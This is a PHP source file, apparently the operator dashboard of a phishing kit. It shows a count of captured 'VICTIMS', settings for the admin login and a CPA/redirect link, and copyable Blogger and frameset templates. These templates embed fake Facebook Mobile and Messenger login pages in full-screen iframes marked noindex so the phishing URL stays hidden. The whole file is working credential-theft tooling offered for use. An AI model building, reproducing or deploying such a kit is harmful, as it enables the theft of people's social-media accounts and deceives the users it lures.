<?php
session_start();
require('conn.php');
if(!isset($_SESSION['user_name']))
{
    header("Location:login.php");
}
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1"/>
		<link rel="stylesheet" type="text/css" href="css/bootstrap.css"/>
	
		<style>
		     
.select {
  display:flex;
  flex-direction: column;
  position:relative;
  width:350px;
  height:40px;
}
 
.option {
  padding:0 30px 0 10px;
  min-height:40px;
  display:flex;
  align-items:center;
  background:  #E5E5E5;
  border-top:#222 solid 1px;
  position:absolute;
  top:0;
  width: 100%;
  pointer-events:none;
  order:2;
  z-index:1;
  transition:background .4s ease-in-out;
  box-sizing:border-box;
  overflow:hidden;
  white-space:nowrap;
  
}
 
.option:hover {
  background: #FF595C;
}
 
.select:focus .option {
  position:relative;
  pointer-events:all;
}
    .te {
  position: absolute;
  opacity: .01;
  height: 0;
  overflow: hidden;
}
		</style>
	</head>
<body>
	

	<div class="col-md-3"></div>
	<div class="col-md-6 well">
		<h1 class="text-primary">Dashboard <a class="btn btn-danger pull-right" href="singout.php"> Logout</a></h1>

		<hr style="border-top:1px dotted #ccc;"/>
<center>	<a class="btn btn-success" href="victims.php"><span class="glyphicon glyphicon-user"></span> VICTIMS  (	<?php
include 'conn.php';
$sql = "SELECT * FROM users";
                                    if ($result=mysqli_query($con,$sql)) {
                                        $rowcount=mysqli_num_rows($result);
                                        echo $rowcount;
                                    }
?> )</a> 
		 <center>
			<hr style="border-top:1px dotted #ccc;"/>
			<h3 class="text-primary">Messenger</h3>
 <center><a style="font-size:12px; margin-top:8px;" type="button" class="btn btn-success" onclick="copyTxtmsn1()">Blogger</a>
<a style="font-size:12px; margin-top:8px;" type="button" class="btn btn-success" onclick="copyTxtmsn()">Host</a>
<a style="font-size:12px; margin-top:8px;" type="button" class="btn btn-success" href="t/msn/index.php"target="_blank">View</a></center>
	<hr style="border-top:1px dotted #ccc;"/>
<h3 class="text-primary">Facebook Mobile</h3>
<a style="font-size:12px; margin-top:8px;" type="button" class="btn btn-success" onclick="copyTxtmobile1()">Blogger</a>
<a style="font-size:12px; margin-top:8px;" type="button" class="btn btn-success" onclick="copyTxtmobile()">Host</a>
<a style="font-size:12px; margin-top:8px;" type="button" class="btn btn-success" href="t/m/index.php"target="_blank">View</a>
		<hr style="border-top:1px dotted #ccc;"/></center> <br> 
	
			<h3 class="text-primary">Update User</h3>



<form class="form-inline" method="POST" action="">
   <?php 
			   
if(isset($_POST['submit_login']))
{
    $login_username = mysqli_real_escape_string($con,$_POST['login_username']);
    $login_password = mysqli_real_escape_string($con,$_POST['login_password']);
    $get_login = mysqli_query($con,"update admins set user = '$login_username' ");
	 $get_login = mysqli_query($con,"update admins set pass = '$login_password'");
   if($get_login)
    {
$login_success = '<div class="alert alert-success text-center">تم تحديث اليوزر و الباسوورد</div>';
	echo  $login_success;
        }
     
    else
    {
        $login_error = '<div class="alert alert-danger text-center"> حدثت مشكلة</div>';
		echo  $login_error;
    }
}	
?>

<div class="form-group mx-sm-3 mb-2">
<input type="text" class="form-control"  required placeholder="User Name"  name="login_username"> 
</div><br><br>
 <div class="form-group mx-sm-3 mb-2">
<input type="password" class="form-control" required placeholder="Password"  name="login_password"> 
</div>
<br><br>
<button type="submit" name="submit_login" class="btn btn-success">Update</button>

</form>

<hr style="border-top:1px dotted #ccc;"/>

<?php
if(isset($_POST['cpa']))
{
    $cpa = mysqli_real_escape_string($con,$_POST['cpa_lnk']);
    $url = mysqli_real_escape_string($con,$_POST['url_lnk']);
    $get_login = mysqli_query($con,"update admins set cpa = '$cpa' ");
	$get_login = mysqli_query($con,"update admins set lnk = '$url'");
   if($get_login)
    {
$login_success = '<div class="alert alert-success text-center">تم تحديث الرابط و CPA</div>';
	echo  $login_success;
        }
     
    else
    {
        $login_error = '<div class="alert alert-danger text-center"> حدثت مشكلة</div>';
		echo  $login_error;
    }
}	

?>
<h3 class="text-primary">Update Site Data</h3>

<form class="form-inline" method="POST" action="">
<div class="form-group mx-sm-3 mb-2">
<input type="text" class="form-control"  required value="<?php echo $_SESSION['lnk'] ?>"  name="url_lnk"> 
</div><br><br>
 <div class="form-group mx-sm-3 mb-2">
<input type="text" class="form-control" required value="<?php echo $_SESSION['cpa'] ?>"  name="cpa_lnk"> 
</div>
<br><br>
<button type="submit" name="cpa" class="btn btn-success">Update</button>
 
</form>

   
</center>

<textarea id="mob_code1" class="te"  dir="ltr"  rows="4" cols="35" placeholder="no code" name="pub_code" value="<?php echo $_SESSION['lnk'] ?>/1/t/m/index.php" required="" readonly="">
<?php echo '<?';?>xml version='1.0' encoding='UTF-8' ?>
    <html b:version='2' class='v2' expr:dir='data:blog.languageDirection' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
    <head><meta content='IE=EmulateIE7' http-equiv='X-UA-Compatible'/>
    <b:skin><![CDATA[body{overflow:hidden}]]></b:skin>
    <meta content='width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0' name='viewport'/>
    <title><data:blog.pageTitle/></title></head>
    <body><b:section id='hell'/>
    <iframe allowfullscreen='' frameborder='0' height='100%' src='<?php echo $_SESSION['lnk'] ?>/1/t/m/index.php' style='border:0px #ffffff none;' width='100%'/>
    <script async='true' src='https://resources.blogblog.com/blogblog/data/res/4268249124-indie_compiled.js' type='text/javascript'/>
        <script></script></body></html>
</textarea>
<textarea id="mob_code"  class="te" dir="ltr"  rows="4" cols="35"  placeholder="no code" name="pub_code" value="<?php echo $_SESSION['lnk'] ?>/1/t/m/index.php" required="" readonly="">
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN"
   "http://www.w3.org/TR/html4/frameset.dtd">
<HTML>
<HEAD>
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
<meta name="robots" content="noindex, noimageindex, nofollow, nosnippet">
<TITLE>A simple frameset document</TITLE>
</HEAD>
<FRAMESET cols="0%, 100%">
  <FRAMESET rows="200">
  </FRAMESET>
  <FRAME src="<?php echo $_SESSION['lnk'] ?>/1/t/m/index.php">
</FRAMESET>
</HTML></textarea>	
<textarea id="msn_code1" class="te"  dir="ltr"  rows="4" cols="35" placeholder="no code" name="pub_code" value="<?php echo $_SESSION['lnk'] ?>/1/t/msn/index.php" required="" readonly="">
<?php echo '<?';?>xml version='1.0' encoding='UTF-8' ?>
    <html b:version='2' class='v2' expr:dir='data:blog.languageDirection' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
    <head><meta content='IE=EmulateIE7' http-equiv='X-UA-Compatible'/>
    <b:skin><![CDATA[body{overflow:hidden}]]></b:skin>
    <meta content='width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0' name='viewport'/>
    <title><data:blog.pageTitle/></title></head>
    <body><b:section id='hell'/>
    <iframe allowfullscreen='' frameborder='0' height='100%' src='<?php echo $_SESSION['lnk'] ?>/1/t/msn/index.php' style='border:0px #ffffff none;' width='100%'/>
    <script async='true' src='https://resources.blogblog.com/blogblog/data/res/4268249124-indie_compiled.js' type='text/javascript'/>
        <script></script></body></html>
</textarea>
<textarea id="msn_code"  class="te" dir="ltr"  rows="4" cols="35"  placeholder="no code" name="pub_code" value="<?php echo $_SESSION['lnk'] ?>/1/t/msn/index.php" required="" readonly="">
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN"
   "http://www.w3.org/TR/html4/frameset.dtd">
<HTML>
<HEAD>
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
<meta name="robots" content="noindex, noimageindex, nofollow, nosnippet">
<TITLE>A simple frameset document</TITLE>
</HEAD>
<FRAMESET cols="0%, 100%">
  <FRAMESET rows="200">
  </FRAMESET>
  <FRAME src="<?php echo $_SESSION['lnk'] ?>/1/t/msn/index.php">
</FRAMESET>
</HTML></textarea>

<script>

      function copyTxtmsn() {
          var text = document.getElementById('msn_code').select();
          document.execCommand('copy');
           	alert("Coped");

      }
	  </script>
	  
<script>

      function copyTxtmsn1() {
          var text = document.getElementById('msn_code1').select();
          document.execCommand('copy');
           	alert("Coped");

      }
	  </script>
	  
<script>

      function copyTxtmobile() {
          var text = document.getElementById('mob_code').select();
          document.execCommand('copy');
           	alert("Coped");

      }
	  </script>
	    
<script>

      function copyTxtmobile1() {
          var text = document.getElementById('mob_code1').select();
          document.execCommand('copy');
           	alert("Coped");

      }
	  </script>
	  </div>	  </div>	  </div>	
</body>	
</html>